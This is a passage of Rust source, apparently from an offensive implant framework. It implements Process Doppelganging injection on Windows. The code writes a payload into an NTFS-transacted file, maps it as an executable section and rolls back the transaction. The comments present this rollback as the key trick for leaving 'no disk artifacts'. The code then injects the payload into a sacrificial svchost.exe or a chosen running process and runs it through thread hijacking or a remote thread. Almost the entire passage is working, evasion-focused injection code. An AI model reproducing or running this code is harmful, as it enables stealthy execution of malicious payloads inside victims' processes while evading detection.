        0u64, // PreviousSuspendCount = NULL
    );

    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!("NtResumeThread failed: status={:?}", status));
    }
    Ok(())
}

// ── Main entry point ─────────────────────────────────────────────────────────

/// Perform Process Doppelganging injection.
///
/// # Arguments
///
/// * `payload` — Shellcode or PE bytes to inject.
/// * `target_process` — Optional target process identifier. If `None`, a new
///   suspended sacrificial process is created (svchost.exe). If `Some("PID")`,
///   the process is opened by PID. If `Some("name")`, the process is found by
///   name.
///
/// # Returns
///
/// A `DoppelgangingResult` on success, or an error string on failure.
///
/// # Safety
///
/// Performs raw memory operations and Windows system calls. Must only be
/// called on Windows x86-64.
///
/// # Process Doppelganging Flow
///
/// ```text
/// NtCreateTransaction → NtCreateFile(tx) → NtWriteFile(tx)
///       → NtCreateSection(file) → NtRollbackTransaction
///       → NtMapViewOfSection(target) → NtCreateThreadEx
/// ```
pub unsafe fn doppelganging_inject(
    payload: &[u8],
    target_process: Option<&str>,
) -> Result<DoppelgangingResult, String> {
    log::info!(
        "injection_doppelganging: starting with payload size={}",
        payload.len()
    );

    // ── Step 1: Create NTFS transaction ───────────────────────────────
    // The transaction wraps all file operations so they can be rolled back.
    let tx_handle = create_transaction()?;

    log::debug!(
        "injection_doppelganging: transaction created, handle={:#x}",
        tx_handle
    );

    // ── Step 2: Create transacted temp file ───────────────────────────
    // The file is created within the transaction and populated with zeros.
    let file_handle = create_transacted_file(tx_handle, payload.len()).map_err(|e| {
        let _ = crate::syscall!("NtClose", tx_handle as u64);
        e
    })?;

    // ── Step 3: Write payload to transacted file ──────────────────────
    // Overwrite the placeholder zeros with the actual payload.
    write_payload_to_file(file_handle, payload).map_err(|e| {
        let _ = crate::syscall!("NtClose", file_handle as u64);
        let _ = crate::syscall!("NtClose", tx_handle as u64);
        e
    })?;

    // ── Step 4: Create section backed by transacted file ──────────────
    // The section now holds a snapshot of the file data.
    let h_section = create_section_from_file(file_handle, payload.len()).map_err(|e| {
        let _ = crate::syscall!("NtClose", file_handle as u64);
        let _ = crate::syscall!("NtClose", tx_handle as u64);
        e
    })?;
    let h_section_guard = crate::nt_handle::NtHandle::new(h_section);

    // Close the file handle — the section holds its own reference.
    let _ = crate::syscall!("NtClose", file_handle as u64);

    // ── Step 5: Roll back the transaction ─────────────────────────────
    // KEY INSIGHT: Rolling back the transaction deletes the temp file from
    // disk, but the section mapping persists in memory. The section data was
    // committed to memory when NtCreateSection was called. This is the core
    // OPSEC value: **no disk artifacts remain**.
    match rollback_transaction(tx_handle) {
        Ok(()) => {
            log::info!("injection_doppelganging: transaction rolled back — no disk artifacts");
        }
        Err(e) => {
            log::warn!(
                "injection_doppelganging: transaction rollback failed (non-fatal, payload already in section): {}",
                e
            );
        }
    }

    let _ = crate::syscall!("NtClose", tx_handle as u64);

    // ── Step 6: Open or create target process ─────────────────────────
    let (process_handle, thread_handle, pid, is_suspended) = match target_process {
        Some(ident) => {
            // Try to parse as PID first, then as process name.
            if let Ok(pid) = ident.parse::<u32>() {
                let h_proc = open_target_process(pid)?;
                // For existing processes, we use NtCreateThreadEx (no suspended thread).
                (h_proc, 0usize, pid, false)
            } else {
                let pid = find_process_by_name(ident)?;
                let h_proc = open_target_process(pid)?;
                (h_proc, 0usize, pid, false)
            }
        }
        None => {
            // Create a new suspended sacrificial process.
            let (h_proc, h_thread, pid) = create_suspended_process()?;
            (h_proc, h_thread, pid, true)
        }
    };

    log::info!(
        "injection_doppelganging: target process pid={}, handle={:#x}, suspended={}",
        pid,
        process_handle,
        is_suspended
    );

    // ── Step 7: Map section into target process ───────────────────────
    // The section is mapped as PAGE_EXECUTE_READ. The payload data came from
    // a file that no longer exists on disk.
    let remote_base =
        map_section_to_process(h_section_guard.raw(), process_handle).map_err(|e| {
            if is_suspended {
                let _ = crate::syscall!("NtTerminateProcess", process_handle as u64, 1u64);
            }
            let _ = crate::syscall!("NtClose", process_handle as u64);
            if thread_handle != 0 {
                let _ = crate::syscall!("NtClose", thread_handle as u64);
            }
            // h_section_guard dropped here — NtClose via Drop
            e
        })?;

    log::debug!(
        "injection_doppelganging: payload mapped at {:#x} in target pid={}",
        remote_base,
        pid
    );

    // P3-14: Flush instruction cache after section mapping.
    //
    // On x86/x64 the instruction cache is coherent with data writes, so
    // NtFlushInstructionCache is a no-op.  On ARM64 (Windows on ARM) or
    // certain virtualized environments with split TLBs, stale cached
    // instructions may be executed without this flush.  Non-fatal: log
    // and continue regardless of return value.
    {
        let flush_status = crate::syscall!(
            "NtFlushInstructionCache",
            process_handle as u64,
            remote_base as u64,
            0u64 // 0 = flush entire range; view_size not readily available here
        );
        match flush_status {
            Ok(s) if s < 0 => {
                log::warn!(
                    "injection_doppelganging: NtFlushInstructionCache returned 0x{:08X} (non-fatal on x64)",
                    s as u32
                );
            }
            Err(_) => {
                log::debug!(
                    "injection_doppelganging: NtFlushInstructionCache syscall not available"
                );
            }
            _ => {} // success (status >= 0)
        }
    }

    // Close section handle — the target has a mapping that references it.
    // h_section_guard dropped here — NtClose via Drop.

    // ── Step 8: Execute payload ───────────────────────────────────────
    let exec_thread_handle = if is_suspended {
        // For a suspended process, redirect the primary thread's RIP.
        redirect_thread(thread_handle, remote_base)?;
        resume_thread(thread_handle)?;
        thread_handle
    } else {
        // For an existing process, create a new remote thread.
        execute_payload(process_handle, remote_base)?
    };

    log::info!(
        "injection_doppelganging: injection complete — pid={}, base={:#x}",
        pid,
        remote_base
    );

    Ok(DoppelgangingResult {
        process_handle: NtHandle::new(process_handle),
        thread_handle: NtHandle::new(exec_thread_handle),
        pid,
    })
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_page_align() {
        assert_eq!(page_align(0), 0);
        assert_eq!(page_align(1), 4096);
        assert_eq!(page_align(4096), 4096);
        assert_eq!(page_align(4097), 8192);
    }
}
